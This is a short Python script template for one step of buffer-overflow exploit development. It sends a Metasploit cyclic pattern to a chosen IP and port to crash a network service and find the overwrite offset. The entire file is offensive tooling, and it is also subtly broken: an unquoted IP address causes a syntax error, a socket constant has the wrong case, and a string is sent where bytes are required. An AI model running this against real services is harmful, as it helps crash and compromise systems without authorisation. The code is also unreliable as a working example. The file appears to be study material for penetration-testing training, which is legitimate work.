#!/usr/bin/python3
# Socket: Needed to send data to the port socket of the target host.
# Time: Needed to sleep X amount of seconds between requests as to not DOS the target host.
# Sys: Needed to exit the python program if we are unable to connect to the target host.
import socket, time, sys

# CHANGE THESE!!!
target_IP = 1.1.1.1
target_port = XXXX
## Enter in the msf-pattern_create string.
input_msf_pattern = XXXX


# Try statement that will send data until it receives an exception from the target host where it is no longer reachable because we crashed it.
try:
  # Print out the size of each request being sent to the target host. 
  print ("\nSending MSF Pattern")
    
  # Initialize and send input_buffer variable fuzzing data through the socket to the target host.
  s = socket.socket (socket.AF_INET, socket.sock_STREAM)
  s.connect((target_IP, target_port))
  s.send(input_msf_pattern)
  s.close()
    
  # Print confirmation after a full socket creation, data sending, and tear down successfully occurs.
  print ("\nSent")
  
# Except statement to catch when the target host program is not responding to data being sent to it.
except:
  print ("\nCould not connect")
  # Exit the python program when we aren't able to send data to the target host.
  sys.exit()
